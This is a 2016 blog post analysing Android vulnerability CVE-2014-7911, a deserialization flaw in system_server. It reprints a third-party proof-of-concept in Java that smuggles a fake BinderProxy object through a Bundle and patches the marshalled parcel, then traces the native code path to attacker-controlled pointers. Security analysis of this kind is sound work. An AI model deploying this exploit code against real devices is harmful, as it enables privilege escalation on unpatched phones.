<!DOCTYPE html>
<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Analysis of cve-2014-7911  &middot; Zeqi&#39;s Blog</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1">


<meta name="description" content="" />

<meta name="keywords" content="android, vulnerability, ">


<meta property="og:title" content="Analysis of cve-2014-7911  &middot; Zeqi&#39;s Blog ">
<meta property="og:site_name" content="Zeqi&#39;s Blog"/>
<meta property="og:url" content="https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/" />
<meta property="og:locale" content="en-EN">


<meta property="og:type" content="article" />
<meta property="og:description" content=""/>
<meta property="og:article:published_time" content="2016-02-29T16:34:11&#43;08:00" />
<meta property="og:article:modified_time" content="2016-02-29T16:34:11&#43;08:00" />

  
    
<meta property="og:article:tag" content="android">
    
<meta property="og:article:tag" content="vulnerability">
    
  

  
<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@" />
<meta name="twitter:creator" content="@" />
<meta name="twitter:title" content="Analysis of cve-2014-7911" />
<meta name="twitter:description" content="" />
<meta name="twitter:url" content="https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/" />
<meta name="twitter:domain" content="https://zeqiii.github.io/">
  

<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "Article",
    "headline": "Analysis of cve-2014-7911",
    "author": {
      "@type": "Person",
      "name": "http://profiles.google.com/+?rel=author"
    },
    "datePublished": "2016-02-29",
    "description": "",
    "wordCount":  739 
  }
</script>



<link rel="canonical" href="https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/" />

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://zeqiii.github.io/touch-icon-144-precomposed.png">
<link href="https://zeqiii.github.io/favicon.png" rel="icon">

<meta name="generator" content="Hugo 0.15" />

  <!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<link href='https://fonts.googleapis.com/css?family=Merriweather:300%7CRaleway%7COpen+Sans' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://zeqiii.github.io/css/font-awesome.min.css">
<link rel="stylesheet" href="https://zeqiii.github.io/css/style.css">
<link rel="stylesheet" href="https://zeqiii.github.io/css/highlight/default.css">

  
</head>
<body>
  <main id="main-wrapper" class="container main_wrapper has-sidebar">
    <header id="main-header" class="container main_header">
  <div class="container brand">
  <div class="container title h1-like">
  <a class="baselink" href="https://zeqiii.github.io/">
  Zeqi&#39;s Blog

</a>

</div>

  
<div class="container topline">
  

</div>


</div>

  <nav class="container nav primary no-print">
  

<a class="homelink" href="https://zeqiii.github.io/">Home</a>


  
<a href="https://zeqiii.github.io/post" title="Show list of posts">Posts</a>

<a href="https://zeqiii.github.io/tags" title="Show list of tags">Tags</a>

<a href="https://zeqiii.github.io/topics" title="Show list of topics">Topics</a>


</nav>

<div class="container nav secondary no-print">
  
<a id="contact-link-email" class="contact_link" href="mailto:zeqiii@163.com">
  <span class="fa fa-envelope-square"></span><span>email</span></a>



<a id="contact-link-github" class="contact_link" href="https://github.com/zeqiii">
  <span class="fa fa-github-square"></span><span>github</span></a>

















</div>


  

</header>


<article id="main-content" class="container main_content single">
  <header class="container hat">
  <h1>Analysis of cve-2014-7911
</h1>

  <div class="metas">
<time datetime="2016-02-29">29 Feb, 2016</time>


  
  &middot; Read in about 4 min
  &middot; (739 Words)
  <br>
  
<a class="label" href="https://zeqiii.github.io/tags/android">android</a>

<a class="label" href="https://zeqiii.github.io/tags/vulnerability">vulnerability</a>



</div>

</header>

  <div class="container content">
  

<h2 id="a-brief-look">A brief look</h2>

<p>System_server is a process has <strong>system</strong> permission, to which one can send any serializable data. Although system_server won&rsquo;t invoke any functions of the received objected, but <code>finalize</code> will be called when <strong>GC</strong>.</p>

<p>Function <code>finalize</code> in <code>android.os.BinderProxy</code> calls a native function which has pointers, the pointers may be controlled by attackers. So <strong>GC</strong> may result in arbitrary code execution. <code>android.os.BinderProxy</code> isn&rsquo;t serializable, however, java.io.ObjectInputStream doesn&rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&rsquo;s blog says:</p>

<blockquote>
<p>ObjectInputStream doesn&rsquo;t validate that the serialized object&rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.</p>
</blockquote>

<h2 id="poc">POC</h2>

<p>Let&rsquo;s just see the POC written by <strong>Jann Horn</strong></p>

<ul>
<li>AAdroid.os.BinderProxy.java</li>
</ul>

<pre><code class="language-java">public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
</code></pre>

<ul>
<li>Partial code of MainActivity.java</li>
</ul>

<pre><code class="language-java">// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&quot;eatthis&quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&quot;android.os.IUserManager&quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub&quot;)) {
        clStub = c;
    }
}
// Get the field &quot;TRANSACTION_setApplicationRestrictions&quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&quot;TRANSACTION_setApplicationRestrictions&quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&quot;mService&quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&quot;android.os.IUserManager.Stub.Proxy&quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&quot;mRemote&quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
</code></pre>

<ul>
<li>Implementation of setApplicationRestrictions</li>
</ul>

<pre><code class="language-java">// This function modifies the Bundle, marshalling it, find &quot;AAdr&quot; and changing it to &quot;andr&quot;, so the class description becomes &quot;android.os.BinderProxy&quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == 'A' &amp;&amp; data[i+1] == 'A' &amp;&amp; data[i+2] == 'd' &amp;&amp; data[i+3] == 'r') { 
                data[i] = 'a'; 
                data[i+1] = 'n'; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
</code></pre>

<p>From the POC we know that a fake object is created and put into a bundle. It&rsquo;s <code>mObject</code> and <code>mOrgue</code> is under attacker&rsquo;s controll and can be set to any values. In function <code>setApplicationRestrictions</code>, the bundle object is written to a parcel using <code>restrictions.writeToParcel</code>. After the parcel marshalled to a byte array, a loop appears to find string <code>AAdr</code>, and change <code>AA</code> to <code>an</code>. Thus, <code>AAdroid.os.BinderProxy</code> finally becomes <code>android.os.BinderProxy</code>. When <code>java.io.ObjectInputStream</code> deserializes this object, a <code>android.os.BinderProxy</code> object will be created. In this way, attackers can create any object and set the field value as they want.</p>

<h2 id="why-binderproxy">Why BinderProxy?</h2>

<p>So why attackers choose <code>android.os.BinderProxy</code>? Here is the source code of it.</p>

<pre><code class="language-java">protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
</code></pre>

<p>The <code>finalize()</code> method will call a native method <code>distroy()</code>.</p>

<pre><code class="language-c++">static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&quot;Destroying BinderProxy %p: binder=%p drl=%p\n&quot;, obj, b, drl);
    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&gt;decStrong((void*)javaObjectForIBinder);
    b-&gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&gt;flushCommands();
}
</code></pre>

<p>In the above method, <code>mOrgue</code> is regarded as a pointer of <code>DeathRecipientList</code>, assigned to <code>drl</code>. Then <code>drl-&gt;decStrong()</code> is invoked.</p>

<pre><code class="language-c++">void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;refs-&gt;mStrong);
#if PRINT_REFS
    ALOGD(&quot;decStrong of %p from %p: cnt=%d\n&quot;, this, id, c);
#endif
    ALOG_ASSERT(c &gt;= 1, &quot;decStrong() called on %p too many times&quot;, refs);
    if (c == 1) {
        refs-&gt;mBase-&gt;onLastStrongRef(id);
        if ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&gt;decWeak(id);
}
</code></pre>

<p>According to other&rsquo;s blog, <code>refs-&gt;mBase-&gt;onLastStrongRef(id);</code> will eventually causes arbitrary code execution. Below is the assembly code sceenshot from <a href="http://wooyun.org/">wooyun.org</a>, attacker controlls r0 (<code>this</code> pointer).</p>

<p><img src="/img/cve-2014-7911/assembly.png" alt="Image of assembly" /></p>

<h2 id="references">References</h2>

<blockquote>
<ul>
<li><a href="http://seclists.org/fulldisclosure/2014/Nov/51">http://seclists.org/fulldisclosure/2014/Nov/51</a></li>
<li><a href="http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.droidsec.cn/cve-2014-7911%E5%AE%89%E5%8D%93%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
<li><a href="http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></li>
<li><a href="http://drops.wooyun.org/mobile/6082">http://drops.wooyun.org/mobile/6082</a></li>
</ul>
</blockquote>

</div>


  <footer class="container">
  <div class="container navigation no-print">
  <h2>Navigation</h2>
  
  

    
    <a class="prev" href="https://zeqiii.github.io/2016/02/29/welcome/" title="Welcome">
      Previous
    </a>
    

    

  


</div>

  <div class="container comments">
  <h2>Comments</h2>
  

</div>

</footer>

</article>
      <footer id="main-footer" class="container main_footer">
  

  <div class="container nav foot no-print">
  

  <a class="toplink" href="#">back to top</a>

</div>

  <div class="container credits">
  
<div class="container footline">
  

</div>


  
<div class="container copyright">
  
  &copy; 2016 zeqi


</div>


</div>

</footer>

    </main>
    


<script src="https://zeqiii.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




    
  </body>
</html>

